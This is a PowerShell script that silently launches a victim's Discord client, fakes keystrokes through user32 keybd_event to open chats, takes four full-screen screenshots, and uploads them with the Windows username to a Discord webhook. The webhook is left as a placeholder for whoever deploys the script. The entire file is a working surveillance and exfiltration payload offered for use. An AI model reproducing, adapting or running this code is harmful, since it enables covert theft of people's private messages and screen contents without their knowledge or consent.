function Upload-Discord {
    param (
        [string]$file,
        [string]$text,
        [string]$webhookUrl
    )

    if ($text) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }
    }
    elseif ($file) {
        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)
    }
}

function screenshot([Drawing.Rectangle]$bounds, $path) {
    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save($path)
    $graphics.Dispose()
    $bmp.Dispose()
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Keyboard {
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);
}
"@

function PressKeys {
    $ctrlKey = 0x11
    $altKey = 0x12
    $rightArrowKey = 0x27

    [Keyboard]::keybd_event($ctrlKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($altKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($rightArrowKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($rightArrowKey, 0, 2, [IntPtr]::Zero)
    [Keyboard]::keybd_event($ctrlKey, 0, 2, [IntPtr]::Zero)
    [Keyboard]::keybd_event($altKey, 0, 2, [IntPtr]::Zero)
}

function PressKeys2 {
    $altKey = 0x12
    $downArrowKey = 0x28

    [Keyboard]::keybd_event($altKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($downArrowKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($downArrowKey, 0, 2, [IntPtr]::Zero)
    [Keyboard]::keybd_event($altKey, 0, 2, [IntPtr]::Zero)
}

function PressKeys3 {
    $altKey = 0x12
    $spaceKey = 0x20
    $upArrowKey = 0x26
    $enterKey = 0x0D

    [Keyboard]::keybd_event($altKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($spaceKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($altKey, 0, 2, [IntPtr]::Zero)
    [Keyboard]::keybd_event($spaceKey, 0, 2, [IntPtr]::Zero)
    Start-Sleep -Seconds 1
    [Keyboard]::keybd_event($upArrowKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($upArrowKey, 0, 2, [IntPtr]::Zero)
    [Keyboard]::keybd_event($upArrowKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($upArrowKey, 0, 2, [IntPtr]::Zero)
    Start-Sleep -Seconds 1
    [Keyboard]::keybd_event($enterKey, 0, 0, [IntPtr]::Zero)
    [Keyboard]::keybd_event($enterKey, 0, 2, [IntPtr]::Zero)
}

function Get-Discord {
    param (
        [string]$WebhookUrl
    )

    $pathsToCheck = @(
        "$env:LOCALAPPDATA\Discord\Update.exe",         
        "$env:ProgramFiles\Discord\Discord.exe",
        "$env:ProgramFiles(x86)\Discord\Discord.exe"
    )

    $discordPath = $null

    foreach ($path in $pathsToCheck) {
        if (Test-Path $path) {
            $discordPath = $path
            break
        }
    }

    if ($discordPath) {
        Start-Process -FilePath $discordPath -ArgumentList "--processStart Discord.exe"
        Start-Sleep -Seconds 1  
        PressKeys3
        Start-Sleep -Seconds 2  
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 2800, 2200)
        $screenshotPath = "$env:TEMP\screenshot1.png"
        screenshot $bounds $screenshotPath  
        PressKeys  
        Start-Sleep -Seconds 2  
        $screenshotPath2 = "$env:TEMP\screenshot2.png"
        screenshot $bounds $screenshotPath2  
        PressKeys2  
        Start-Sleep -Seconds 2  
        $screenshotPath3 = "$env:TEMP\screenshot3.png"
        screenshot $bounds $screenshotPath3  
        PressKeys  
        PressKeys2
        Start-Sleep -Seconds 2.5  
        $screenshotPath4 = "$env:TEMP\screenshot4.png"
        screenshot $bounds $screenshotPath4  

        if ($WebhookUrl) {
            Upload-Discord -file $screenshotPath -webhookUrl $WebhookUrl
            Upload-Discord -file $screenshotPath2 -webhookUrl $WebhookUrl
            Upload-Discord -file $screenshotPath3 -webhookUrl $WebhookUrl
            Upload-Discord -file $screenshotPath4 -webhookUrl $WebhookUrl
        }
    } else {
        Write-Output "Discord is not installed on this machine."
    }
}

#Get-Discord -WebhookUrl "YOUR DISCORD WEBHOOK"
